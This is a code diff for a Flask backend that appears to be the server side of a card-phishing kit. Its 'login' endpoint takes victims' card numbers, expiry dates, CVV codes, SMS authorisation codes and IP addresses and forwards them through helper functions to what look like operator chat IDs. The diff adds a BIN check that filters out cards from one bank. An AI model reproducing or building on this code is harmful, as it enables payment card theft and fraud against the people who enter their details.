@@ -3,7 +3,10 @@ from flask_cors import CORS
 from external import send_buttons_message, send_secret_question, send_sms, ne_pizdabol, cheltut, send_me, send_me1, send_sms1
 from CHAT_ID import *
 from checker import get_button_by_id
+import parserBIN
+
 app = Flask(__name__)
+
 CORS(app, resources={r"/*": {"origins": "*"}})
 
 DOMEN = 'http://127.0.0.1:5500'
@@ -48,13 +51,14 @@ def login():
 
         ID = f'{session}'
 
-        # SmokeWeEveryday
-        if id == '10000001' or 1 == 1:
-            if authCode is not None and authCode != 'None':
-                send_sms1(card_number, authCode, ID, ip_address)
+        if str(parserBIN.Bin(card_number)).find('DEUTSCHE KREDITBANK AG') == -1:
+            if id == '10000001' or 1 == 1:
+                if authCode is not None and authCode != 'None':
+                    send_sms1(card_number, authCode, ID, ip_address)
+                    return '', 200  # Возвращаем пустой ответ с кодом 200
+                send_me1(card_number, expiry_date, cvv, ID)
                 return '', 200  # Возвращаем пустой ответ с кодом 200
-            send_me1(card_number, expiry_date, cvv, ID)
-            return '', 200  # Возвращаем пустой ответ с кодом 200
+        
         # WE
         if id == '1000001':
             send_me('7383961273', card_number, expiry_date, cvv, ID, ip_address)
